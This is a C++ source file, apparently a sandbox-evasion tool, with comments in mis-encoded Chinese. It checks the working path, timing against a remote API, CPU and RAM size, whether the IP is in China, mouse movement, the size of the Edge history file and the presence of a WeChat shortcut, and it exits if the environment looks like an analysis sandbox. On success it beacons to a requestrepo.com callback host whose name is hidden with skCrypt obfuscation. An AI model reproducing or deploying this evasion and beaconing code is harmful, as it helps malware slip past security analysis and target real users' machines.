#include "header.h"

//����skCrypter����
std::string charToString(const char* str) {
    return std::string(str);
}
//���΢���ͷ�·��
std::string workingdir()
{
    char buf[256];
    GetCurrentDirectoryA(256, buf);
    return std::string(buf);
}
bool check_run_path() {
    std::string test(workingdir());
    std::regex pattern("^C:\\\\[A-Za-z0-9_]+");
    if (std::regex_match(test, pattern)) {
        return false;
        exit(0);
    }
    else {
        return true;
    }
}
//WaitForSingleObject�ӳ٣�����ƴ���ʱ���api�жϲ�ֵ
bool check_time() {
    auto url = ("http://api.pinduoduo.com");
    httplib::Client cli(url);
    auto res = cli.Get("/api/server/_stm");
    std::string time_str1;
    if (res->status == 200) {
        for (char c : res->body) {
            if (c >= '0' && c <= '9') {
                time_str1 += c;
            }
        }
    }
    else {
        return false;
    }
    long long api_time1 = std::stoll(time_str1);
    time_t currentTime1 = time(0);
    //��ʼ����300��
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(hEvent, 300000);//300s
    CloseHandle(hEvent);
    res = cli.Get("/api/server/_stm");
    std::string time_str2;
    if (res->status == 200) {
        for (char c : res->body) {
            if (c >= '0' && c <= '9') {
                time_str2 += c;
            }
        }
    }
    else {
        return false;
    }
    long long api_time2 = std::stoll(time_str2);
    //�жϲ�ֵ
    if (api_time2 - api_time1 > 290000) {
        return true;
    }
    else {
        exit(0);
        return false;
    }
}
//CPU������Ϊ�����з�����������
bool check_cpu() {
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    //��������6������
    if (numberOfProcessors < 6) {
        return false;
    }
    else {
        return true;
    }
}
//ram�ڴ��СΪ�����з���
bool check_ram() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    return (RAMMB >= 8192);
}
//�ж��Ƿ���й�ip
bool check_ip() {
    auto url = "http://ip-api.com";
    httplib::Client cli(url);
    auto res = cli.Get("/csv");
    std::string ip_str;
    if (res->status == 200) {
        for (char c : res->body) {
            ip_str += c;
        }
    }
    else {
        exit(0);
        return false;
    }
    if (ip_str.find("China") != std::string::npos) {
        //std::cout << "The string contains 'China'." << std::endl;
        return true;
    }
    else {
        //std::cout << "The string does not contain 'China'." << std::endl;
        exit(0);
        return false;
    }
}
//�ж����
double distance(POINT p1, POINT p2) {
    double dx = p2.x - p1.x;
    double dy = p2.y - p1.y;
    return sqrt(dx * dx + dy * dy);
}
bool check_mouse() {
    POINT p1, p2, p3;
    GetCursorPos(&p1);
    Sleep(3000);
    GetCursorPos(&p2);
    Sleep(3000); 
    GetCursorPos(&p3);
    double d1 = distance(p1, p2);
    double d2 = distance(p2, p3);
    double d3 = distance(p3, p1);
    // ����Ƿ��ܹ���һ����������
    if ((d1 + d2 > d3) && (d2 + d3 > d1) && (d1 + d3 > d2)) {
        return true;
    }
    else {
        return false;
    }
}
std::string wstringToString(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}
//�ж�edge������ı��������¼�Ƿ����20kb,������win10�����ϵ�Ŀ������
bool check_edge() {
    wchar_t username[256 + 1];
    DWORD username_len = 256 + 1;
    GetUserName(username, &username_len);
    std::string uname = wstringToString(username);
    std::string filePath = "C:\\Users\\" + uname + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History";
    // ����ļ��Ƿ����
    if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        // �ļ�������
        return FALSE;
    }
    // ��ȡ�ļ���С
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // �޷����ļ�
        return FALSE;
    }
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        // ��ȡ�ļ���Сʧ��
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);
    // �Ƚ��ļ���С��20KB
    const DWORDLONG TwentyKB = 20 * 1024;
    if (fileSize.QuadPart > TwentyKB) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}
//�ж�΢�ŵĿ�ݷ�ʽ�Ƿ���ڣ�΢�Ű�װʱ���Զ���C:\Users\Public\Desktop�´�����ݷ�ʽ�������ȡϵͳ�û������˷���������
bool check_wechat() {
    std::string filePath = "C:\\Users\\Public\\Desktop\\΢��.lnk";
    // ����ļ��Ƿ����
    if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        // �ļ�������
        return FALSE;
    }
    else {
        return TRUE;
    }
}
//�жϸ��Ĳ����Ƿ��������� x+y=10,x*y=24,����ʱ��������Anti-Sandbox.exe 4 6 �ſɳɹ�����
bool check_args(char* argv[]) {
    if (atoi(argv[1]) + atoi(argv[2]) != 10 && atoi(argv[1]) * atoi(argv[2]) != 24) {
            return false;
    }
    else {
        return true;
    }
}
int main(int argc, char* argv[]) {
    //������ʾ�Ѿ��ɹ�ִ��
    if (check_args(argv)) {
        //dnslog��ַ �����и������߲�ʹ��
        //ʹ����skCrypt������ַ��� ��ֹ��̬��������dnslog��ַ
        auto url = skCrypt("ul6u2p5x.requestrepo.com");
        httplib::Client cli(charToString(url));
        httplib::Params p;
        p.emplace("success", "true");
        auto res = cli.Post("/", p);
        MessageBoxA(NULL, "SUCCESS", "SUCCESS", NULL);
    }
    else {
        MessageBoxA(NULL, "Fail", "Fail", NULL);
    }
    
}